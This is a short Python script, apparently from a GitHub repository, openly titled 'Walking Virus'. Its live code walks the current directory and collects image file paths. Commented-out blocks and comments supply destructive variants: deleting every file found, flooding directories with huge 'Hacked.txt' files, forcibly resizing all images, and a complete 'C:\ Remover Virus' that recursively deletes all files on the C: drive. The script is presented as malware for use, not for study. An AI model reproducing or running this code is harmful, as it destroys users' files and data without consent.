# Walking Virus
# By sreemanreddy
# github https://github.com/awoosr/python-virus/

from PIL import Image
import os

img = []
for root, dirs, files in os.walk(".", topdown=False):
    for name in files :
        try:
            s = os.path.join(root, name)
            # or you can use os.remove(s) to remove all files without if in source
            # or you can make file in directories with open("Hacked.txt","w").write("hacked\n"*1000000)
            if "jpg" in s:
                img.append(s)
            elif "png" in s:
                img.append(s)
            elif "jpeg" in s:
                img.append(s)
        except:
            pass


# Photo Resizer Virus
#for i in img:
#    image = Image.open(i)
#    resized_image = image.resize((500,500))



# C:\ Remover Virus
#for root, dirs, files in os.walk("C:\\", topdown=False):
#    for name in files :
#        try:
#            s = os.path.join(root, name)
#            os.remove(s)
#        except:
#            pass
